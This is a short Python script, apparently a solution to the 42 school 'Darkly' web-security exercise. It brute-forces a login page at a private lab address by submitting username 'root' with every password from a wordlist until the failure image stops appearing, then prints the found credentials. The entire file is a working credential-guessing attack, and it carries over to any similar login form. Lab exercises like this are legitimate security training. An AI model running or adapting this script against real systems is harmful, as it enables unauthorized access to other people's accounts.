import requests
from termcolor import colored

url = "http://10.11.249.222/?page=signin"
username = "root"
password_file = "/Users/nesta/Desktop/42/darkly/Bruteforce/Ressources/passwords.txt"
login_failed_string = "images/WrongAnswer.gif"
cookie_value = ""


def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		response = requests.get(url, params={'username':username,'password':password,'Login':'Login'})
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			print(response.content.decode())
			exit()



print('[*] Bruteforcing Against ' + url)
print('[*] Using Username: ' + username)
print('[*] Using Password File: ' + password_file)

with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')